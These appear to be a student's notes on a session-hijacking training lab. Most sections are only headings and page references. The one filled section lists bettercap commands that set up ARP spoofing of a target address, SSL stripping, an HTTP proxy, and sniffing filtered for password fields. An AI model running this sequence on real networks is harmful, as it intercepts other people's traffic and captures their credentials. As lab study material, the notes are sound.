# LAB 1. Perform Session Hijacking
---
## 1.1 Hijacking a Session using Zed Attack Proxy (ZAP)
---
**LAB Manual 3 : Page 1362**





## Task 2 Intercept HTTP Traffic using bettercap
---
**LAB Manual 3 : Page 1377**
1. bettercap -h
2. bettercap -iface wlo1
3. help
4. net.probe on
5. net.recon on
6. set http.proxy.sslstrip true    # enables SSL striping.
7. set arp.spoof.internal true     # spoofs the loacl connections amoung computers of the internal network
8. set arp.spoof.targets 10.10.1.11
9. http.proxy on     # initiates http proxy
10. arp.spoof on    # initiates arp spoofing
11. net.sniff on      # performing sniffing on the network
12. `set net.sniff.regexp '.*password=.+'`   # only consider the packet sent with a payload matchiing the given regular.


## Task 3: Intercept HTTP Traffic using Hetty
---
**LAB Manual 3 : Page 1387**

# LAB 2 : Detect Session Hijacking
---
## Task 1 : Detect Session Hijacking using Wireshark
---
**LAB Manual 3 : Page 1400**
![[Pasted image 20241028183336.png]]